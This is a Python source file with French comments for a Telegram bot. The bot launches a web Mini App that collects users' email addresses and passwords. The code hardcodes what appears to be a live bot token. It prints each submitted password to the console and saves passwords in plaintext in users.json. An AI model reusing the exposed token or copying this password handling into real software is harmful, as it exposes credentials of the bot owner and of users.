from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import json
import os   # Assurez-vous que os est bien importé

# --- Reste de votre code (BOT_TOKEN, WEB_APP_URL) ---
BOT_TOKEN = "7174970942:AAERseUdYk9WBoztRjQbaOgIrCeRypldmfo"
WEB_APP_URL = "https://abdine24.github.io/bot/index.html"

# NOUVEAU : Chemin absolu pour le fichier JSON
# Cela garantit que le fichier users.json est créé dans le même dossier que bot.py
USERS_DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'users.json')
print(f"Le fichier de base de données des utilisateurs sera : {USERS_DB_FILE}") # Ajout pour le débogage

# --- Fonctions de gestion de la base de données JSON ---

def load_users():
    """Charge les utilisateurs depuis le fichier JSON."""
    if os.path.exists(USERS_DB_FILE):
        with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
            try:
                data = json.load(f)
                print(f"Utilisateurs chargés depuis {USERS_DB_FILE}: {len(data)} enregistrements.") # Debug
                return data
            except json.JSONDecodeError:
                print(f"ATTENTION: Fichier {USERS_DB_FILE} vide ou corrompu. Création d'une nouvelle base de données vide.") # Debug
                return {}
            except Exception as e:
                print(f"Erreur inattendue lors du chargement de {USERS_DB_FILE}: {e}") # Debug
                return {}
    print(f"Fichier {USERS_DB_FILE} non trouvé. Création d'une nouvelle base de données vide.") # Debug
    return {}

def save_users(users_data):
    """Sauvegarde les utilisateurs dans le fichier JSON."""
    try:
        with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(users_data, f, indent=4, ensure_ascii=False)
        print(f"Données utilisateurs sauvegardées avec succès dans {USERS_DB_FILE}.") # Debug
    except Exception as e:
        print(f"ERREUR CRITIQUE: Impossible de sauvegarder les données dans {USERS_DB_FILE}. Erreur: {e}") # Debug en cas d'échec d'écriture

# --- FIN Fonctions de gestion de la base de données JSON ---

# --- Reste de votre code (start, handle_all_messages, main) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Envoie un message avec un bouton pour ouvrir la Mini App."""
    keyboard = [
        [InlineKeyboardButton("Ouvrir mon application", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Salut ! Clique sur le bouton ci-dessous pour lancer ma super Mini App :",
        reply_markup=reply_markup
    )

async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Gère tous les messages et filtre ceux de la Mini App."""
    
    # Vérifie si le message provient d'une Web App
    if update.effective_message and update.effective_message.web_app_data:
        web_app_data = update.effective_message.web_app_data.data
        
        try:
            data = json.loads(web_app_data)
            
            email = data.get("email")
            password = data.get("password") 

            user_id = update.effective_user.id
            username = update.effective_user.username

            print(f"Données reçues de la Mini App pour l'utilisateur {user_id} (@{username if username else 'N/A'}):")
            print(f"Email: {email}")
            print(f"Mot de passe: {password}")

            users = load_users() # Charge les utilisateurs existants

            if email in users:
                await update.message.reply_text(
                    f"Bonjour de nouveau, {email} ! Vos informations semblent déjà enregistrées.\n"
                    f"Si vous souhaitez modifier votre mot de passe, utilisez une autre option."
                )
            else:
                users[email] = {
                    "telegram_user_id": user_id,
                    "telegram_username": username,
                    "password": password, 
                    "registration_date": update.message.date.isoformat()
                }
                save_users(users) # Sauvegarde les utilisateurs mis à jour

                await update.message.reply_text(
                    f"Merci pour votre inscription, {email} !\n"
                    f"Nous avons bien reçu vos informations et les avons enregistrées."
                )

        except json.JSONDecodeError:
            print(f"Erreur: Données de la Web App non-JSON : {web_app_data}")
            await update.message.reply_text("Désolé, une erreur est survenue lors de la réception de vos données.")
        except Exception as e:
            print(f"Erreur inattendue lors du traitement des données de la Web App : {e}")
            await update.message.reply_text("Désolé, une erreur interne est survenue.")
    else:
        if update.effective_message.text:
            await update.message.reply_text(f"J'ai reçu votre message : {update.effective_message.text}. Pour lancer l'application, tapez /start.")


def main() -> None:
    """Démarre le bot."""
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.ALL, handle_all_messages))

    print("Bot démarré. En attente de commandes et de données de Mini App...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()